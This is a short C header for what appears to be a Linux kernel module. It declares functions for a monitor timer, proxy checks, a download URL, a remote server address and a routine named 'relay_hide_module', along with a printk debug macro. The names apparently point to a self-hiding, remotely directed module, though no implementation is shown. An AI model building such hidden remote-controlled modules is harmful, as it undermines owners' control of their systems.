#ifndef _MONITOR_PROC_H_
#define _MONITOR_PROC_H_

int is_enable_proxy(void);

int init_monitor_timer(int period);
int del_monitor_timer(void);
char *get_download_url(void);
int check_b_server_info(void);
char *get_b_server_addr(void);
void relay_hide_module(void);
void send_key_file_change_msg(void);
char *get_base_filename(char *fullpath);

extern atomic_t printflag;

#define MY_PRINT(format, args...) \
    do { \
        if (atomic_read(&printflag)) { \
            printk(KERN_INFO format, ##args); \
        } \
    } while(0)

#endif

